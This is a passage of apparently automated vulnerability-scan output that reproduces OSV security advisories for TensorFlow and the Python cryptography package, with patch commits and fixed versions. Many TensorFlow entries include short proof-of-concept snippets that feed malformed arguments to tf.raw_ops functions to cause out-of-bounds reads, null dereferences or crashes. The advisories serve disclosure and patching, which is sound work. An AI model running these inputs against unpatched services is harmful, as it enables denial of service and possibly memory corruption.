Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Pattarakrit Rattankul.

    Fixed in:  ['2.8.4', '2.9.3', '2.10.1']
    Link:      https://osv.dev/vulnerability/GHSA-h246-cgh4-7475
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-8w5g-3wcv-9g2j
    Aliases:   ['CVE-2022-41880']
    Details:   ### Impact
When the [`BaseCandidateSamplerOp`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/candidate_sampler_ops.cc) function  receives a value in `true_classes` larger than `range_max`, a heap oob vuln occurs.
```python
tf.raw_ops.ThreadUnsafeUnigramCandidateSampler(
    true_classes=[[0x100000,1]],
    num_true = 2,
    num_sampled = 2,
    unique = False,
    range_max = 2,
    seed = 2,
    seed2 = 2)
```

### Patches
We have patched the issue in GitHub commit [b389f5c944cadfdfe599b3f1e4026e036f30d2d4](https://github.com/tensorflow/tensorflow/commit/b389f5c944cadfdfe599b3f1e4026e036f30d2d4).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.

    Fixed in:  ['2.10.1', '2.8.4', '2.9.3']
    Link:      https://osv.dev/vulnerability/GHSA-8w5g-3wcv-9g2j
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-jq6x-99hj-q636
    Aliases:   ['CVE-2022-41884']
    Details:   ### Impact
If a numpy array is created with a shape such that one element is zero and the others sum to a large number, an error will be raised. E.g. the following raises an error:
```python
np.ones((0, 2**31, 2**31))
```
An example of a proof of concept:
```python
import numpy as np
import tensorflow as tf

input_val = tf.constant([1])
shape_val = np.array([i for i in range(21)])

tf.broadcast_to(input=input_val,shape=shape_val)
```
The return value of `PyArray_SimpleNewFromData`, which returns null on such shapes, is not checked.

### Patches
We have patched the issue in GitHub commit [2b56169c16e375c521a3bc8ea658811cc0793784](https://github.com/tensorflow/tensorflow/commit/2b56169c16e375c521a3bc8ea658811cc0793784).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Pattarakrit Rattanukul.

    Fixed in:  ['2.8.4', '2.9.3', '2.10.1']
    Link:      https://osv.dev/vulnerability/GHSA-jq6x-99hj-q636
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-mv77-9g28-cwg3
    Aliases:   ['CVE-2022-41908']
    Details:   ### Impact
An input `token` that is not a UTF-8 bytestring will trigger a `CHECK` fail in [`tf.raw_ops.PyFunc`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/lib/core/py_func.cc).

```python
import tensorflow as tf

value = tf.constant(value=[1,2])
token = b'\xb0'
dataType = [tf.int32]

tf.raw_ops.PyFunc(input=value,token=token,Tout=dataType)
```

### Patches
We have patched the issue in GitHub commit [9f03a9d3bafe902c1e6beb105b2f24172f238645](https://github.com/tensorflow/tensorflow/commit/9f03a9d3bafe902c1e6beb105b2f24172f238645).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by pattarakritr@smu.edu.sg

    Fixed in:  ['2.8.4', '2.9.3', '2.10.1']
    Link:      https://osv.dev/vulnerability/GHSA-mv77-9g28-cwg3
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-6hg6-5c2q-7rcr
    Aliases:   ['CVE-2023-25664']
    Details:   ### Impact
```python
import os
os.environ['TF_ENABLE_ONEDNN_OPTS'] = '0'
import tensorflow as tf
print(tf.__version__)
with tf.device("CPU"):
    ksize = [1, 40, 128, 1]
    strides = [1, 128, 128, 30]
    padding = "SAME"
    data_format = "NHWC"
    orig_input_shape = [11, 9, 78, 9]
    grad = tf.saturate_cast(tf.random.uniform([16, 16, 16, 16], minval=-128, maxval=129, dtype=tf.int64), dtype=tf.float32)
    res = tf.raw_ops.AvgPoolGrad(
        ksize=ksize,
        strides=strides,
        padding=padding,
        data_format=data_format,
        orig_input_shape=orig_input_shape,
        grad=grad,
    )
```

### Patches
We have patched the issue in GitHub commit [ddaac2bdd099bec5d7923dea45276a7558217e5b](https://github.com/tensorflow/tensorflow/commit/ddaac2bdd099bec5d7923dea45276a7558217e5b).

The fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by <evn@google.com>

    Fixed in:  ['2.11.1']
    Link:      https://osv.dev/vulnerability/GHSA-6hg6-5c2q-7rcr
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-93vr-9q9m-pj8p
    Aliases:   ['CVE-2023-25659']
    Details:   ### Impact
If the parameter `indices` for `DynamicStitch` does not match the shape of the parameter `data`, it can trigger an stack OOB read.

```python
import tensorflow as tf
func = tf.raw_ops.DynamicStitch
para={'indices': [[0xdeadbeef], [405], [519], [758], [1015]], 'data': [[110.27793884277344], [120.29475402832031], [157.2418212890625], [157.2626953125], [188.45382690429688]]}
y = func(**para)
```

### Patches
We have patched the issue in GitHub commit [ee004b18b976eeb5a758020af8880236cd707d05](https://github.com/tensorflow/tensorflow/commit/ee004b18b976eeb5a758020af8880236cd707d05).

The fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This has been reported via Google OSS VRP.
    Fixed in:  ['2.11.1']
    Link:      https://osv.dev/vulnerability/GHSA-93vr-9q9m-pj8p
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-6wfh-89q8-44jq
    Aliases:   ['CVE-2023-25676']
    Details:   ### Impact
When running with XLA, `tf.raw_ops.ParallelConcat` segfaults with a nullptr dereference when given a parameter `shape` with rank that is not greater than zero.

```python
import tensorflow as tf

func = tf.raw_ops.ParallelConcat
para = {'shape':  0, 'values': [1]}

@tf.function(jit_compile=True)
def test():
   y = func(**para)
   return y

test()
```

### Patches
We have patched the issue in GitHub commit [da66bc6d5ff466aee084f9e7397980a24890cd15](https://github.com/tensorflow/tensorflow/commit/da66bc6d5ff466aee084f9e7397980a24890cd15).

The fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by r3pwnx of 360 AIVul Team

    Fixed in:  ['2.11.1']
    Link:      https://osv.dev/vulnerability/GHSA-6wfh-89q8-44jq
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-qjqc-vqcf-5qvj
    Aliases:   ['CVE-2023-25660']
    Details:   ### Impact
When the parameter `summarize` of `tf.raw_ops.Print` is zero, the new method `SummarizeArray<bool>` will reference to a nullptr, leading to a seg fault.

```python
import tensorflow as tf

tf.raw_ops.Print(input =  tf.constant([1, 1, 1, 1],dtype=tf.int32),
                            data =  [[False, False, False, False], [False], [False, False, False]],
                            message =  'tmp/I',
                            first_n = 100,
                            summarize = 0)
```

### Patches
We have patched the issue in GitHub commit [6d423b8bcc9aa9f5554dc988c1c16d038b508df1](https://github.com/tensorflow/tensorflow/commit/6d423b8bcc9aa9f5554dc988c1c16d038b508df1).

The fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team

    Fixed in:  ['2.11.1']
    Link:      https://osv.dev/vulnerability/GHSA-qjqc-vqcf-5qvj
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-64jg-wjww-7c5w
    Aliases:   ['CVE-2023-25663']
    Details:   ### Impact
When ctx->step_containter() is a null ptr, the Lookup function will be executed with a null pointer.
```python
import tensorflow as tf
tf.raw_ops.TensorArrayConcatV2(handle=['a', 'b'], flow_in = 0.1, dtype=tf.int32, element_shape_except0=1)
```

### Patches
We have patched the issue in GitHub commit [239139d2ae6a81ae9ba499ad78b56d9b2931538a](https://github.com/tensorflow/tensorflow/commit/239139d2ae6a81ae9ba499ad78b56d9b2931538a).

The fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Yu Tian
    Fixed in:  ['2.11.1']
    Link:      https://osv.dev/vulnerability/GHSA-64jg-wjww-7c5w
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-gw97-ff7c-9v96
    Aliases:   ['CVE-2023-25668']
    Details:   ### Impact
Attackers using Tensorflow can exploit the vulnerability. They can access heap memory which is not in the control of user, leading to a crash or RCE.
When axis is larger than the dim of input, c->Dim(input,axis) goes out of bound.
Same problem occurs in the QuantizeAndDequantizeV2/V3/V4/V4Grad operations too.
```python
import tensorflow as tf
@tf.function
def test():
    tf.raw_ops.QuantizeAndDequantizeV2(input=[2.5],
    								   input_min=[1.0],
    								   input_max=[10.0],
    								   signed_input=True,
    								   num_bits=1,
    								   range_given=True,
    								   round_mode='HALF_TO_EVEN',
    								   narrow_range=True,
    								   axis=0x7fffffff)
test()
```



### Patches
We have patched the issue in GitHub commit [7b174a0f2e40ff3f3aa957aecddfd5aaae35eccb](https://github.com/tensorflow/tensorflow/commit/7b174a0f2e40ff3f3aa957aecddfd5aaae35eccb).

The fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.



    Fixed in:  ['2.11.1']
    Link:      https://osv.dev/vulnerability/GHSA-gw97-ff7c-9v96
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-49rq-hwc3-x77w
    Aliases:   ['CVE-2023-25670']
    Details:   ### Impact
NPE in QuantizedMatMulWithBiasAndDequantize with MKL enable 
```python
import tensorflow as tf

func = tf.raw_ops.QuantizedMatMulWithBiasAndDequantize
para={'a': tf.constant(138, dtype=tf.quint8), 'b': tf.constant(4, dtype=tf.qint8), 'bias': [[31.81644630432129, 47.21876525878906], [109.95201110839844, 152.07968139648438]], 'min_a': 141.5337138686371, 'max_a': [73.84139251708984, 173.15280151367188], 'min_b': [], 'max_b': [[16.128345489501953, 193.26820373535156]], 'min_freezed_output': [], 'max_freezed_output': [115.50032806396484, 156.974853515625], 'Toutput': 1.0, 'transpose_a': True, 'transpose_b': False, 'input_quant_mode': 'MIN_FIRST'}

func(**para)
```

### Patches
We have patched the issue in GitHub commit [8a47a39d9697969206d23a523c977238717e8727](https://github.com/tensorflow/tensorflow/commit/8a47a39d9697969206d23a523c977238717e8727).

The fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by r3pwnx

    Fixed in:  ['2.11.1']
    Link:      https://osv.dev/vulnerability/GHSA-49rq-hwc3-x77w
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-gf97-q72m-7579
    Aliases:   ['CVE-2023-25674']
    Details:   ### Impact
NPE in RandomShuffle with XLA enable 
```python
import tensorflow as tf

func = tf.raw_ops.RandomShuffle
para = {'value': 1e+20, 'seed': -4294967297, 'seed2': -2147483649}

@tf.function(jit_compile=True)
def test():
   y = func(**para)
   return y

test()
```

### Patches
We have patched the issue in GitHub commit [728113a3be690facad6ce436660a0bc1858017fa](https://github.com/tensorflow/tensorflow/commit/728113a3be690facad6ce436660a0bc1858017fa).

The fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by r3pwnx

    Fixed in:  ['2.11.1']
    Link:      https://osv.dev/vulnerability/GHSA-gf97-q72m-7579
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-7x4v-9gxg-9hwj
    Aliases:   ['CVE-2023-25675']
    Details:   ### Impact
When running with XLA, `tf.raw_ops.Bincount` segfaults when given a parameter `weights` that is neither the same shape as parameter `arr` nor a length-0 tensor.

```python
import tensorflow as tf

func = tf.raw_ops.Bincount
para={'arr': 6, 'size': 804, 'weights': [52, 351]}

@tf.function(jit_compile=True)
def fuzz_jit():
 y = func(**para)
 return y

print(fuzz_jit())
```

### Patches
We have patched the issue in GitHub commit [8ae76cf085f4be26295d2ecf2081e759e04b8acf](https://github.com/tensorflow/tensorflow/commit/8ae76cf085f4be26295d2ecf2081e759e04b8acf).

The fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by r3pwnx of 360 AIVul Team

    Fixed in:  ['2.11.1']
    Link:      https://osv.dev/vulnerability/GHSA-7x4v-9gxg-9hwj
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-j5w9-hmfh-4cr6
    Aliases:   ['CVE-2023-25671']
    Details:   ### Impact
Out-of-bounds access due to mismatched integer type sizes in ValueMap::Manager::GetValueOrCreatePlaceholder. Bug with tfg-translate call to InitMlir. The problem happens with generic functions, as it is already handled for non-generic functions. This is because they, unlike non-generic functions, are using the "old importer". A better long-term solution may be to have the "new importer" handle generic functions.

### Patches
We have patched the issue in GitHub
- commit [760322a71ac9033e122ef1f4b1c62813021e5938](https://github.com/tensorflow/tensorflow/commit/760322a71ac9033e122ef1f4b1c62813021e5938).
- commit [2eedc8f676d2c3b8be9492e547b2bc814c10b367](https://github.com/tensorflow/tensorflow/commit/2eedc8f676d2c3b8be9492e547b2bc814c10b367)

The fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by r3pwnx

### Affiliation
360 AIVul


    Fixed in:  ['2.11.1']
    Link:      https://osv.dev/vulnerability/GHSA-j5w9-hmfh-4cr6
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-94mm-g2mv-8p7r
    Aliases:   ['CVE-2023-25672']
    Details:   ### Impact
The function `tf.raw_ops.LookupTableImportV2` cannot handle scalars in the `values` parameter and gives an NPE.

```python
import tensorflow as tf

v = tf.Variable(1)

@tf.function(jit_compile=True)
def test():
   func = tf.raw_ops.LookupTableImportV2
   para={'table_handle': v.handle,'keys': [62.98910140991211, 94.36528015136719], 'values': -919}

   y = func(**para)
   return y

print(test())
```

### Patches
We have patched the issue in GitHub commit [980b22536abcbbe1b4a5642fc940af33d8c19b69](https://github.com/tensorflow/tensorflow/commit/980b22536abcbbe1b4a5642fc940af33d8c19b69).

The fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by r3pwnx of 360 AIVul Team

    Fixed in:  ['2.11.1']
    Link:      https://osv.dev/vulnerability/GHSA-94mm-g2mv-8p7r
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-rcf8-g8jv-vg6p
    Aliases:   ['CVE-2023-25669']
    Details:   ### Impact
If the stride and window size are not positive for `tf.raw_ops.AvgPoolGrad`, it can give an FPE.

```python
import tensorflow as tf
import numpy as np

@tf.function(jit_compile=True)
def test():
   y = tf.raw_ops.AvgPoolGrad(orig_input_shape=[1,0,0,0], grad=[[[[0.39117979]]]], ksize=[1,0,0,0], strides=[1,0,0,0], padding="SAME", data_format="NCHW")
   return y

print(test())
```

### Patches
We have patched the issue in GitHub commit [1295ae4dbb52fe06b19733b0257e2340d7b63b8d](https://github.com/tensorflow/tensorflow/commit/1295ae4dbb52fe06b19733b0257e2340d7b63b8d).

The fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by r3pwnx of 360 AIVul Team

    Fixed in:  ['2.11.1']
    Link:      https://osv.dev/vulnerability/GHSA-rcf8-g8jv-vg6p
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-7jvm-xxmr-v5cw
    Aliases:   ['CVE-2023-25662']
    Details:   ### Impact
TFversion 2.11.0 //tensorflow/core/ops/array_ops.cc:1067 const Tensor* hypothesis_shape_t = c->input_tensor(2); std::vector<DimensionHandle> dims(hypothesis_shape_t->NumElements() - 1); for (int i = 0; i < dims.size(); ++i) { dims[i] = c->MakeDim(std::max(h_values(i), t_values(i))); }

if hypothesis_shape_t is empty, hypothesis_shape_t->NumElements() - 1 will be integer overflow, and the it will deadlock
```python
import tensorflow as tf
para={
    'hypothesis_indices': [[]],
    'hypothesis_values': ['tmp/'],
    'hypothesis_shape': [],
    'truth_indices': [[]],
    'truth_values': [''],
    'truth_shape': [],
    'normalize': False
    }
tf.raw_ops.EditDistance(**para)
```

### Patches
We have patched the issue in GitHub commit [08b8e18643d6dcde00890733b270ff8d9960c56c](https://github.com/tensorflow/tensorflow/commit/08b8e18643d6dcde00890733b270ff8d9960c56c).

The fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by r3pwnx
    Fixed in:  ['2.11.1']
    Link:      https://osv.dev/vulnerability/GHSA-7jvm-xxmr-v5cw
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-647v-r7qq-24fh
    Aliases:   ['CVE-2023-25673']
    Details:   ### Impact
FPE in TensorListSplit with XLA 
```python
import tensorflow as tf

func = tf.raw_ops.TensorListSplit
para = {'tensor': [1], 'element_shape': -1, 'lengths': [0]}

@tf.function(jit_compile=True)
def fuzz_jit():
 y = func(**para)
 return y

print(fuzz_jit())
```

### Patches
We have patched the issue in GitHub commit [728113a3be690facad6ce436660a0bc1858017fa](https://github.com/tensorflow/tensorflow/commit/728113a3be690facad6ce436660a0bc1858017fa).

The fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by r3pwnx
    Fixed in:  ['2.11.1']
    Link:      https://osv.dev/vulnerability/GHSA-647v-r7qq-24fh
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-68v3-g9cm-rmm6
    Aliases:   ['CVE-2023-25658']
    Details:   ### Impact
Out of bounds read in GRUBlockCellGrad
```python
func = tf.raw_ops.GRUBlockCellGrad

para = {'x': [[21.1, 156.2], [83.3, 115.4]], 'h_prev': array([[136.5],
      [136.6]]), 'w_ru': array([[26.7,  0.8],
      [47.9, 26.1],
      [26.2, 26.3]]), 'w_c': array([[ 0.4],
      [31.5],
      [ 0.6]]), 'b_ru': array([0.1, 0.2 ], dtype=float32), 'b_c': 0x41414141, 'r': array([[0.3],
      [0.4]], dtype=float32), 'u': array([[5.7],
      [5.8]]), 'c': array([[52.9],
      [53.1]]), 'd_h': array([[172.2],
      [188.3 ]])}
```

### Patches
We have patched the issue in GitHub commit [ff459137c2716a2a60f7d441b855fcb466d778cb](https://github.com/tensorflow/tensorflow/commit/ff459137c2716a2a60f7d441b855fcb466d778cb).

The fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by r3pwnx.

    Fixed in:  ['2.11.1']
    Link:      https://osv.dev/vulnerability/GHSA-68v3-g9cm-rmm6
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-5w96-866f-6rm8
    Aliases:   ['CVE-2023-27579']
    Details:   ### Impact
Constructing a tflite model with a paramater `filter_input_channel` of less than 1 gives a FPE.


### Patches
We have patched the issue in GitHub commit [34f8368c535253f5c9cb3a303297743b62442aaa](https://github.com/tensorflow/tensorflow/commit/34f8368c535253f5c9cb3a303297743b62442aaa).

The fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability was reported by Wang Xuan of Qihoo 360 AIVul Team.

    Fixed in:  ['2.11.1']
    Link:      https://osv.dev/vulnerability/GHSA-5w96-866f-6rm8
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-f637-vh3r-vfh2
    Aliases:   ['CVE-2023-25666']
    Details:   ### Impact
version:2.11.0 //core/ops/audio_ops.cc:70

Status SpectrogramShapeFn(InferenceContext* c) { ShapeHandle input; TF_RETURN_IF_ERROR(c->WithRank(c->input(0), 2, &input)); int32_t window_size; TF_RETURN_IF_ERROR(c->GetAttr("window_size", &window_size)); int32_t stride; TF_RETURN_IF_ERROR(c->GetAttr("stride", &stride)); .....[1]

DimensionHandle input_length = c->Dim(input, 0); DimensionHandle input_channels = c->Dim(input, 1);

DimensionHandle output_length; if (!c->ValueKnown(input_length)) { output_length = c->UnknownDim(); } else { const int64_t input_length_value = c->Value(input_length); const int64_t length_minus_window = (input_length_value - window_size); int64_t output_length_value; if (length_minus_window < 0) { output_length_value = 0; } else { output_length_value = 1 + (length_minus_window / stride); .....[2] } output_length = c->MakeDim(output_length_value); }

Get the value of stride at [1], and the used at [2]
```python
import tensorflow as tf

para = {'input': tf.constant([[14.], [24.]], dtype=tf.float32), 'window_size': 1, 'stride': 0, 'magnitude_squared': False}
func = tf.raw_ops.AudioSpectrogram

@tf.function(jit_compile=True)
def fuzz_jit():
   y = func(**para)
   return y

fuzz_jit()
```

### Patches
We have patched the issue in GitHub commit [d0d4e779da0d0f56499c6fa5ba09f0a576cc6b14](https://github.com/tensorflow/tensorflow/commit/d0d4e779da0d0f56499c6fa5ba09f0a576cc6b14).

The fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by r3pwnx

    Fixed in:  ['2.11.1']
    Link:      https://osv.dev/vulnerability/GHSA-f637-vh3r-vfh2
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-558h-mq8x-7q9g
    Aliases:   ['CVE-2023-25665']
    Details:   ### Impact
When `SparseSparseMaximum` is given invalid sparse tensors as inputs, it can give an NPE. 

```python
import tensorflow as tf
tf.raw_ops.SparseSparseMaximum(
 a_indices=[[1]],
 a_values =[ 0.1 ],
 a_shape = [2],
 b_indices=[[]],
 b_values =[2 ],
 b_shape = [2],
)
```

### Patches
We have patched the issue in GitHub commit [5e0ecfb42f5f65629fd7a4edd6c4afe7ff0feb04](https://github.com/tensorflow/tensorflow/commit/5e0ecfb42f5f65629fd7a4edd6c4afe7ff0feb04).

The fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team
    Fixed in:  ['2.11.1']
    Link:      https://osv.dev/vulnerability/GHSA-558h-mq8x-7q9g
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-f49c-87jh-g47q
    Aliases:   ['CVE-2023-25801']
    Details:   ### Impact
`nn_ops.fractional_avg_pool_v2` and `nn_ops.fractional_max_pool_v2` require the first and fourth elements of their parameter `pooling_ratio` to be equal to 1.0, as pooling on batch and channel dimensions is not supported.

```python
import tensorflow as tf
import os
import numpy as np
from tensorflow.python.ops import nn_ops
try:
  arg_0_tensor = tf.random.uniform([3, 30, 50, 3], dtype=tf.float64)
  arg_0 = tf.identity(arg_0_tensor)
  arg_1_0 = 2
  arg_1_1 = 3
  arg_1_2 = 1
  arg_1_3 = 1
  arg_1 = [arg_1_0,arg_1_1,arg_1_2,arg_1_3,]
  arg_2 = True
  arg_3 = True
  seed = 341261001
  out = nn_ops.fractional_avg_pool_v2(arg_0,arg_1,arg_2,arg_3,seed=seed,)
except Exception as e:
  print("Error:"+str(e))
```

### Patches
We have patched the issue in GitHub commit [ee50d1e00f81f62a4517453f721c634bbb478307](https://github.com/tensorflow/tensorflow/commit/ee50d1e00f81f62a4517453f721c634bbb478307).

The fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability was reported by [dmc1778](https://github.com/dmc1778), of [nimashiri2012@gmail.com](mailto:nimashiri2012@gmail.com).

    Fixed in:  ['2.11.1']
    Link:      https://osv.dev/vulnerability/GHSA-f49c-87jh-g47q
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-fqm2-gh8w-gr68
    Aliases:   ['CVE-2023-25667']
    Details:   ### Impact
Integer overflow occurs when 2^31 <= num_frames * height * width * channels < 2^32, for example Full HD screencast of at least 346 frames.
```python
import urllib.request
dat = urllib.request.urlopen('https://raw.githubusercontent.com/tensorflow/tensorflow/1c38ad9b78ffe06076745a1ee00cec42f39ff726/tensorflow/core/lib/gif/testdata/3g_multiframe.gif').read()
import tensorflow as tf
tf.io.decode_gif(dat)
```

### Patches
We have patched the issue in GitHub commit [8dc723fcdd1a6127d6c970bd2ecb18b019a1a58d](https://github.com/tensorflow/tensorflow/commit/8dc723fcdd1a6127d6c970bd2ecb18b019a1a58d).

The fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Andrei

    Fixed in:  ['2.11.1']
    Link:      https://osv.dev/vulnerability/GHSA-fqm2-gh8w-gr68
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 2.9.1 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-cryptography-3.4.8_1,1' / PIP's package 'cryptography-3.4.8' is vulnerable:
    Id:        GHSA-w7pp-m8wf-vj6r
    Aliases:   ['CVE-2023-23931']
    Details:   Previously, `Cipher.update_into` would accept Python objects which implement the buffer protocol, but provide only immutable buffers:

```pycon
>>> outbuf = b"\x00" * 32
>>> c = ciphers.Cipher(AES(b"\x00" * 32), modes.ECB()).encryptor()
>>> c.update_into(b"\x00" * 16, outbuf)
16
>>> outbuf
b'\xdc\x95\xc0x\xa2@\x89\x89\xadH\xa2\x14\x92\x84 \x87\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

This would allow immutable objects (such as `bytes`) to be mutated, thus violating fundamental rules of Python. This is a soundness bug -- it allows programmers to misuse an API, it cannot be exploited by attacker controlled data alone.

This now correctly raises an exception.

This issue has been present since `update_into` was originally introduced in cryptography 1.8.
    Fixed in:  ['39.0.1']
    Link:      https://osv.dev/vulnerability/GHSA-w7pp-m8wf-vj6r
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-x4qr-2fvf-3mr5
    Aliases:   ['CVE-2023-0286']
    Details:   pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.8.1-39.0.0  are vulnerable to a security issue. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20221213.txt and https://www.openssl.org/news/secadv/20230207.txt.

